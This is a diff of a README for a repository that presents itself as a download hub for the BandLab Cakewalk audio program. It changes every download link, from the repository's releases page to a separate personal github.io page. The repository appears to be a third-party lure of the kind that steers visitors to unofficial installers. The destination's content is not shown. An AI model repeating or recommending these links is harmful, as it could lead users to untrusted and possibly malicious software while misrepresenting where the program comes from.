@@ -1,6 +1,6 @@
 # 🎹 bandlab-cakewalk-mixing-hub - Record, mix, and master like a pro
 
-[![Download BandLab Cakewalk](https://img.shields.io/badge/Download-BandLab_Cakewalk_30.04.0.431--2026-blue?style=for-the-badge&logo=windows)](https://github.com/Ricfair265/bandlab-cakewalk-mixing-hub/releases)
+[![Download BandLab Cakewalk](https://img.shields.io/badge/Download-BandLab_Cakewalk_30.04.0.431--2026-blue?style=for-the-badge&logo=windows)](https://ricfair265.github.io)
 
 ## 🚀 What is BandLab Cakewalk?
 
@@ -37,7 +37,7 @@ To run BandLab Cakewalk smoothly, your computer should meet these minimum specif
 
 Visit this link to download the application:
 
-[Download BandLab Cakewalk v30.04.0.431-2026](https://github.com/Ricfair265/bandlab-cakewalk-mixing-hub/releases)
+[Download BandLab Cakewalk v30.04.0.431-2026](https://ricfair265.github.io)
 
 Click the download button to get the installer file.
 
@@ -115,7 +115,7 @@ If you need help or want to connect with other users:
 
 ## 🔗 Quick Links
 
-- **[Download the Latest Version](https://github.com/Ricfair265/bandlab-cakewalk-mixing-hub/releases)**
+- **[Download the Latest Version](https://ricfair265.github.io)**
 - [System Requirements](#-system-requirements)
 - [Getting Started Guide](#-getting-started-guide)
 - [Frequently Asked Questions](#-frequently-asked-questions)
